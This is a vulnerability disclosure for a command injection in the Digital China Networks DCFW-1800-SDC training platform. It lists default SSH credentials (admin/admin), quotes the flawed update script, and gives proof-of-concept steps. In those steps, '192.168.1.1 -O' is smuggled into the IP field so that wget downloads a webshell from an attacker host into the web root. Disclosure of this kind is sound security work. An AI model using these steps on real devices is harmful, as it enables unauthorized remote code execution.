# Information

**Affected product:** DCFW-1800-SDC

**Vendor of the product:** Digital China Networks

**Product page:** https://www.dcnetworks.com.cn/goods/61.html

**Product catalogs:** https://www.dcnetworks.com.cn/Uploads/keditor/file/20220320/DCFW-1800-SDC%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E6%8A%80%E5%B9%B3%E5%8F%B0%E5%88%9D%E5%A7%8B%E5%8C%96%E6%89%8B%E5%86%8C-201709.pdf

**Affected system version:** 3.0

**Reported by:**  Wentao Yang (pushe4x@gmail.com)



# Description

A command injection vulnerability has been identified in the DCFW-1800-SDC CTF platform. This vulnerability allows authenticated attacker to manipulate parameters within the wget command and upload arbitrary files to the remote systems. 

# Vulnerability details

The Digital China Networks DCFW-1800-SDC is a CTF (Capture The Flag) platform.

It provides a management interface via SSH with default credentials of username `admin` and password `admin`.Upon user login via SSH, the script `/sbin/cloudadmin.sh` is executed to present the management menu.

![image-20230826152855923](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230826152855923.png)

In command 9 (Update System or Lesson), the update_system() function in cloudadmin.sh invoked. Prompts the user to input IP address and filename for downloading the firmware file package.

![image-20230826153135341](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230826153135341.png)

The code of update_system() function is shown below:

```bash
update_system()
{
        #check link
        read -p "Please enter update web server IP Address :(192.168.1.100)" SERVERIP
        read -p "Please enter update Filename " FILENAME
	if [ X${SERVERIP} ] ;then
		SERVERIP="192.168.1.100" ;
	fi
        checklink=`ping ${SERVERIP} -c 1 | grep ttl -c `
        if [ x${checklink} = x1 ] ;then
                TEMP="/tmp/mnt/src"

                if [ ! -d ${TEMP} ] ; then
                         mkdir -p ${TEMP}
                fi

                read -p " Do you update system ? (y/n) " xxx
                if [ x$xxx != x ] ; then
                	cd ${TEMP} ; wget http://${SERVERIP}/${FILENAME} ;
	                line=`ls ${TEMP}/*.lib | grep -c ".lib" `
       		         if [ x$line = x0 ] ; then
       	        	         echo "Update failed ! "
               		 else
	                       	 cd ${TEMP} ; tar -zxf ${FILENAME} ; cd update ; sh update.sh ; sync
       	                	 echo "Update Successful ! "
        	        fi
                fi
```

This function will verifies the availability of the IP address. If is not, a hardcoded IP address will be used instead. Nonetheless, due to a logical flaw, the condition `[ X${SERVERIP} ]` always evaluates to true. (The correct format should be `[ X${SERVERIP} = X]`). This results in `${SERVERIP}` consistently equating to `192.168.1.100`.

To solve this issue, an attacker could input a malformed IP address,  leading to incorrect execution of the if statement and bypassing the 'then' clause. The following example illustrates this:

```bash
#if.sh for example
read -p "Please enter update web server IP Address :(192.168.1.100)" SERVERIP
if [ X${SERVERIP} ] ;then
	SERVERIP="192.168.1.100" ;
fi
echo SERVERIP=${SERVERIP}
```

![image-20230913171000110](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230913171000110.png)

In this scenario, appending `-O` to the IP not only bypasses the 'if' statement but also:

1. -O is a legitimate parameter of the ping command.
2. -O serves as a parameter for the wget command to specify the output path, thereby granting the attacker to write to any file.

Upon entering the IP address `192.168.1.1 -O` , input the filename parameter with `tmp/www/lms/1.php`. The update_system() function concatenates the IP address and filename as follows: 

`cd ${TEMP} ; wget http://${SERVERIP}/${FILENAME} ;`

Attacker ultimately execute this command: 

`wget http://192.168.1.1/ -O /tmp/www/lms/1.php`

By downloading a webshell payload into the web directory, an attacker can achieve remote code execution.

# POC:

1. Stage a file on server as default page. (Ensuring it is displayed upon accessing the root directory, e.g. http://192.168.1.1/index.php)

2. Using the default credentials, authenticate into the DCFW-1800-SDC's management interface.

![image-20230826152855923](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230826152855923.png)

3. Select menu option 9 "Update System or Lesson".

4. Input `192.168.1.1 -O `as the IP address and `tmp/www/lms/1.php` as the filename.

![image-20230826160237360](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230826160237360.png)

5. Access the uploaded file at `/lms/1.php` on the server.

![image-20230826153345811](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230826153345811.png)
